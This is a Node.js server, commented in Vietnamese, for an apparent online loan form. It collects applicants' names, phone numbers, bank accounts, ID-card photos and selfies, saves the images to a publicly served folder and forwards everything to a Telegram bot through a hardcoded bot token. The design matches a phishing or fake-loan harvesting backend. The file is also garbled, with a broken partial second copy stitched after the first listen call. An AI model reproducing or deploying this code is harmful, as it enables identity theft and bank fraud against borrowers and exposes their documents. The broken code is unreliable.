const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

// === THAY THÔNG TIN TELEGRAM CỦA BẠN VÀO 2 DÒNG DƯỚI ===
const TELEGRAM_BOT_TOKEN = '8999331195:AAFgHthGvHsksplYrygVPrRFPj3JY9ltHL4'; 
const TELEGRAM_CHAT_ID = '8999331195'; 

if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads');
}

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Trả về trang chủ index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// Gửi Telegram bằng module https mặc định (Không lo lỗi MODULE_NOT_FOUND)
function sendTelegramMessage(text) {
    return new Promise((resolve) => {
        const data = JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            resolve();
        });

        req.on('error', (e) => {
            console.error('Lỗi Telegram:', e);
            resolve();
        });

        req.write(data);
        req.end();
    });
}

app.post('/api/submit-loan', upload.fields([
    { name: 'cccdFront', maxCount: 1 },
    { name: 'selfie', maxCount: 1 }
]), async (req, res) => {
    try {
        const { amount, days, fullName, phone, bankAccount, bankName } = req.body;
        const cccdFile = req.files['cccdFront'] ? req.files['cccdFront'][0].filename : null;
        const selfieFile = req.files['selfie'] ? req.files['selfie'][0].filename : null;
        const loanId = 'VAY' + Date.now().toString().slice(-6);

        const host = req.get('host');
        const protocol = req.protocol;
        const baseUrl = `${protocol}://${host}`;

        const message = `
🔥 <b>HỒ SƠ VAY MỚI: #${loanId}</b>
----------------------------------
👤 <b>Họ tên:</b> ${fullName.toUpperCase()}
📞 <b>SĐT:</b> <code>${phone}</code>
💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} đ (${days} ngày)
🏦 <b>Ngân hàng:</b> ${bankName}
💳 <b>STK:</b> <code>${bankAccount}</code>
----------------------------------
🖼 <b>Ảnh CCCD:</b> ${baseUrl}/uploads/${cccdFile}
🤳 <b>Ảnh Selfie:</b> ${baseUrl}/uploads/${selfieFile}
        `;

        await sendTelegramMessage(message);
        res.json({ success: true, message: 'Thành công', loanId: loanId });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Lỗi server' });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
        });
    } catch (err) { console.error('Lỗi Telegram:', err); }
}

app.post('/api/submit-loan', upload.fields([
    { name: 'cccdFront', maxCount: 1 },
    { name: 'selfie', maxCount: 1 }
]), async (req, res) => {
    try {
        const { amount, days, fullName, phone, bankAccount, bankName } = req.body;
        const cccdFile = req.files['cccdFront'] ? req.files['cccdFront'][0].filename : null;
        const selfieFile = req.files['selfie'] ? req.files['selfie'][0].filename : null;
        const loanId = 'VAY' + Date.now().toString().slice(-6);

        // Lấy domain website hiện tại để tạo link ảnh
        const host = req.get('host');
        const protocol = req.protocol;
        const baseUrl = `${protocol}://${host}`;

        const message = `
🔥 <b>HỒ SƠ VAY MỚI: #${loanId}</b>
----------------------------------
👤 <b>Họ tên:</b> ${fullName.toUpperCase()}
📞 <b>SĐT:</b> <code>${phone}</code>
💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} đ (${days} ngày)
🏦 <b>Ngân hàng:</b> ${bankName}
💳 <b>STK:</b> <code>${bankAccount}</code>
----------------------------------
🖼 <b>Ảnh CCCD:</b> ${baseUrl}/uploads/${cccdFile}
🤳 <b>Ảnh Selfie:</b> ${baseUrl}/uploads/${selfieFile}
        `;

        await sendTelegramMessage(message);
        res.json({ success: true, message: 'Thành công', loanId: loanId });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Lỗi server' });
    }
});
// Khai báo đường dẫn trả về trang chủ index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
    
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
